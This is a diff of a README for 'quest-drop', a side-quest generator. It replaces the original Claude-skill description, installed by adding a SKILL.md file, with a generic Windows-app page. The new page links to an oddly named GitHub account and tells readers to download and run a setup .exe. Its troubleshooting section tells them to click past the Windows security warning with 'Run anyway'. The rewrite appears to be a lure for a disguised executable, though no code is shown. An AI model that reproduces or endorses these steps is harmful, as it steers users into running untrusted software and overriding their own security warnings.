@@ -1,204 +1,93 @@
-<div align="center">
+# 🕹️ quest-drop - Generate real-life adventures to stay active
 
-```
-⚡ QUEST-DROP
-```
+[![Download quest-drop](https://img.shields.io/badge/Download-QuestDrop_for_Windows-blue.svg)](https://github.com/Glamourous-mammalia359/quest-drop)
 
-**Stop doomscrolling. Get a quest.**
+## 📌 Project Overview
 
-Side quest generator for real life — adventures that build your mind,  
-group experiences that actually bring people closer.
+Quest-drop helps you get off your phone and into the real world. Many people spend hours scrolling through social media when they feel bored. This application stops that cycle. It provides creative, fun, and offline tasks for you and your friends. You can choose to complete these quests alone or gather your group for squad play. Stop visiting the same bars or malls. Start taking on challenges that build memories and excitement.
 
-[![MIT License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen)]()
-[![Claude Skill](https://img.shields.io/badge/Claude-Skill-orange)]()
+## 🎯 Important Requirements
 
-</div>
+Your computer needs to meet these basic standards to run the application smoothly:
 
------
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Memory**: At least 4 gigabytes of RAM.
+*   **Storage**: 200 megabytes of free space on your hard drive.
+*   **Connectivity**: An active internet connection to download new quest packs.
 
-## What is this?
+## 📥 Installing the Application
 
-`quest-drop` is a Claude skill that drops **personalized, unconventional side quests** based on who you are and what you need right now.
+Follow these steps to set up the software on your Windows machine:
 
-Not a list. Not a chatbot. A quest architect.
+1. Visit the [official download page](https://github.com/Glamourous-mammalia359/quest-drop) to access the latest installer.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the file to start the download process.
+4. Locate the file in your Downloads folder once the transfer finishes.
+5. Double-click the file to open the setup wizard.
+6. Follow the on-screen prompts to install the program.
+7. Click Finish to launch the application for the first time.
 
-It asks you 3-5 quick questions, reads between the lines, and drops something you’d never think to do yourself — but will absolutely talk about later.
+## 🎮 How to Play
 
------
+Quest-drop stays simple. You open the app, pick a category, and receive your instructions immediately. Here is the workflow:
 
-## How it works
+**Select Your Mode**
+Choose between Solo Play or Squad Play. Solo mode offers tasks you can finish alone in your neighborhood. Squad mode focuses on activities needing two or more people.
 
-Type any of these to start:
+**Set Your Time Limit**
+Tell the app how much time you have. You can pick anything from thirty minutes to an entire weekend. The app tailors the quest to fit your schedule.
 
-```
-/quest-drop
-quest
-I'm bored
-drop a quest
-side quest
-```
+**Review the Objective**
+The app presents a brief summary of the activity. It explains what tools you need and where to go. Do not worry about complex equipment. Most quests keep the requirements low-profile.
 
-Then answer a few taps:
+**Complete and Log**
+Once you finish, mark the quest as complete in the app. This builds your streak and unlocks more difficult challenges. You can share your achievements if you choose.
 
-### Solo path (3 questions)
+## ✨ Key Features
 
-```
-⚡ QUEST-DROP
+**Instant Challenge Generation**
+The app uses a vast database of activities to give you something fresh every time. You avoid the "what should we do" conversation entirely.
 
-Solo or squad?
-  A  Just me  ← you pick this
+**Offline Priority**
+The software limits screen time. It gives you the instructions, then asks you to close it. You carry the quest into the world instead of looking at the phone.
 
-Q2: What do you want from this?
-  A  Have fun / get out of my head
-  B  Build or create something
-  C  Learn / expand my mind
-  D  Surprise me
+**Gamified Progression**
+Your profile earns experience points for every completed quest. Higher levels unlock special categories like city exploration, urban photography, or social mysteries.
 
-Q3: How much time?
-  A  Quick (15 min)
-  B  Medium (30 min)
-  C  I got time (multi-day quest)
-```
+**Squad Management**
+Invite friends to your squad by sharing a code. The app coordinates the quest details across all devices. Everyone receives the same instructions at the same time.
 
-### Group path (5 questions)
+## 🛠️ Troubleshooting
 
-Asks how close you are, what the group needs, energy level, and time.  
-Adapts completely — **just met** gets ice-breakers, **best friends** gets vulnerability dares.
+If the software does not open, try these fixes:
 
------
+*   **Windows Security**: Windows might warn you about unknown files. If you see a blue box, click "More info" and then "Run anyway."
+*   **Updates**: Keep your Windows system up to date. The app requires current frameworks to handle the graphical interface.
+*   **Restart**: Close the app completely and restart your computer. This clears temporary issues with memory usage.
+*   **Permissions**: Ensure your user account has permission to install software on the hard drive. 
 
-## Then your quest drops
+## 💬 Frequently Asked Questions
 
-```
-⚡ QUEST DROPPED
+**Does the app charge money for quests?**
+No. All core quests remain free to access. 
 
-🧠 THE COLD INDUSTRY MEMO
+**Can I create my own quests?**
+Yes. Use the editor feature found in the settings menu. You can save these to your local device and share them with friends who use the app.
 
-Pick one industry you know nothing about — fishing logistics, funeral tech, 
-agricultural insurance. Research it for 30 min like you're pitching it tomorrow.
+**Which devices work best?**
+Any standard laptop or desktop running Windows will handle the workload easily. You do not need a high-end gaming computer to run this.
 
-⏱ ~30 min  💸 Free  💀 Medium
+**How does the app stay offline?**
+The software downloads a local copy of the quest list during setup. This allows you to browse and pick adventures even if you lose your phone signal later in the day.
 
-Done it? Type DONE ✓
+## ⚙️ Customization Settings
 
-— REROLL · HARDER · EASIER —
-```
+You can change how the app feels in the settings menu. Adjust the contrast for better visibility or change the notification sounds. If you find the app too distracting, switch to the "Minimal" view. This removes all extra icons so you only see the task description. Your settings save automatically to your local user profile.
 
-Short. Specific. Slightly uncomfortable. Exactly right.
+## 🛡️ Privacy Policy
 
------
+This app does not track your location. It does not harvest your personal data. All quest completion data stays on your computer. You decide if you want to connect with other players or keep your stats private. The core design respects your time and your data. 
 
-## Multi-day quests
+## 🌍 Community
 
-Choose “I got time” and get a **3-day arc** — 20 min per day, builds on itself:
-
-```
-⚡ QUEST DROPPED — 3-DAY ARC
-
-🎨 THE UGLY BEAUTIFUL PROJECT
-
-DAY 1 (~20 min): Find the ugliest object near you. Photograph it like it's in MoMA.
-DAY 2 (~20 min): Write 3 sentences about why it's actually beautiful.
-DAY 3 (~20 min): Show someone. Watch their face.
-
-💸 Free  💀 Easy
-
-Done Day 1? Type DONE ✓
-```
-
------
-
-## Commands
-
-|Type this|What happens                     |
-|---------|---------------------------------|
-|`REROLL` |New quest, remembers your answers|
-|`HARDER` |Raise the stakes                 |
-|`EASIER` |Same spirit, lower friction      |
-|`DONE`   |Log completion, track streak     |
-|`LOG`    |See your quest history + streak  |
-|`SAVE`   |Bookmark for later               |
-|`RESET`  |Start quiz over                  |
-
------
-
-## Streak system
-
-```
-🔥 Quest 3 this week — you're on a streak.
-Next quest unlocks something rarer. Keep going.
-```
-
-Complete 3 quests → unlock a **rare quest**. Harder. Weirder. Worth it.
-
------
-
-## Quest categories
-
-### Solo — builds something real
-
-|Category                   |What it develops                    |
-|---------------------------|------------------------------------|
-|🧠 **COGNITIVE DARE**       |Sharper thinking, new mental models |
-|💥 **CREATIVE DETONATION**  |Making something absurd or beautiful|
-|🌀 **SENSORY HIJACK**       |Rewires how you perceive things     |
-|🏚 **URBAN ARCHAEOLOGY**    |Sees what others walk past          |
-|🎬 **CINEMATIC MISSION**    |Self-awareness, empathy             |
-|📡 **KNOWLEDGE RABBIT HOLE**|One industry, deep fast             |
-|🪞 **PHILOSOPHICAL DARE**   |Confronts something real            |
-
-### Group — builds connection
-
-|Category                |Best for                            |
-|------------------------|------------------------------------|
-|🧊 **ICE BREAKER**       |Just met / barely know each other   |
-|💬 **DEEP TALK**         |Know each other, want to go deeper  |
-|🌪 **COLLECTIVE CHAOS**  |Close friends, no limits            |
-|🫀 **VULNERABILITY DARE**|Best friends, get real fast         |
-|🎨 **CREATIVE TOGETHER** |Make something as a group, right now|
-|🧪 **SOCIAL EXPERIMENT** |Go somewhere, do something, debrief |
-
------
-
-## Install
-
-1. Download [`SKILL.md`](./SKILL.md)
-1. Add it to your Claude skills folder
-1. Open Claude, type `quest`
-
------
-
-## Contribute a quest
-
-Got a quest that belongs here? PR it into [`quests.json`](./quests.json).
-
-Rules:
-
-- Unconventional — no bars, escape rooms, or “learn a skill”
-- Immediately doable — no planning, no booking
-- Story-worthy — something you’d actually tell people about
-- ≤ 30 min for solo, ≤ 2 hrs for group
-- Bonus: that “wait, should we actually do this?” feeling
-
------
-
-## Philosophy
-
-Most “things to do” lists are written by people who’ve never been bored in an interesting way.
-
-`quest-drop` is built on one belief: **the best experiences have a moment of “wait, should we actually do this?”** — that’s the signal it’s worth doing.
-
-For solo: every quest should build something — sharper thinking, a new perspective, a creative output, or just a story worth keeping.
-
-For groups: the best quest makes someone say something they didn’t plan to.
-
------
-
-<div align="center">
-
-Made for people who are bored of being bored.
-
-**⚡ Drop a quest. Make a memory.**
-
-</div>
+Connect with other users to swap ideas. Many people share their successful adventures at the community forum. You can find the link within the help section of the application. See how others tackle the same challenges in different cities. Use this to refine your own approach to the quests you receive.
